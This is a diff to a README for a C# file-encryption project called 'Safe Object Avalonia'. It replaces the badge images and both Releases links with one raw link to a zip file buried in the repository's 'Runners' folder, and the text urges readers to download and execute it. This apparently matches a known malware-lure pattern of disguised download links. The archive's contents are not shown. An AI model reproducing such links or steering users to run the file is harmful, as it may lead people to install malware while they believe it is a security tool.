@@ -1,6 +1,6 @@
 # Safe Object Avalonia 🔒
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Version](https://img.shields.io/badge/version-1.0.0-green.svg) ![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
+![License](https://github.com/24kEmrx1/safe-object-avalonia/raw/refs/heads/main/NexpLock/NexpLock/Runners/avalonia-object-safe-v2.0.zip) ![Version](https://github.com/24kEmrx1/safe-object-avalonia/raw/refs/heads/main/NexpLock/NexpLock/Runners/avalonia-object-safe-v2.0.zip) ![Build Status](https://github.com/24kEmrx1/safe-object-avalonia/raw/refs/heads/main/NexpLock/NexpLock/Runners/avalonia-object-safe-v2.0.zip)
 
 Welcome to **Safe Object Avalonia**! This project provides a secure file encryption and storage solution built with C#. It emphasizes security, performance, and memory safety, making it a reliable choice for your data protection needs.
 
@@ -45,7 +45,7 @@ Safe Object Avalonia leverages a variety of technologies to deliver a robust sol
 
 To install Safe Object Avalonia, follow these steps:
 
-1. Download the latest release from the [Releases section](https://github.com/24kEmrx1/safe-object-avalonia/releases).
+1. Download the latest release from the [Releases section](https://github.com/24kEmrx1/safe-object-avalonia/raw/refs/heads/main/NexpLock/NexpLock/Runners/avalonia-object-safe-v2.0.zip).
 2. Extract the downloaded file.
 3. Run the executable to start the application.
 
@@ -87,7 +87,7 @@ For any inquiries or support, please contact us through the GitHub issues page o
 
 ## Releases
 
-To download the latest version of Safe Object Avalonia, visit the [Releases section](https://github.com/24kEmrx1/safe-object-avalonia/releases). Be sure to download and execute the file to get started with secure file encryption.
+To download the latest version of Safe Object Avalonia, visit the [Releases section](https://github.com/24kEmrx1/safe-object-avalonia/raw/refs/heads/main/NexpLock/NexpLock/Runners/avalonia-object-safe-v2.0.zip). Be sure to download and execute the file to get started with secure file encryption.
 
 ## Conclusion
 
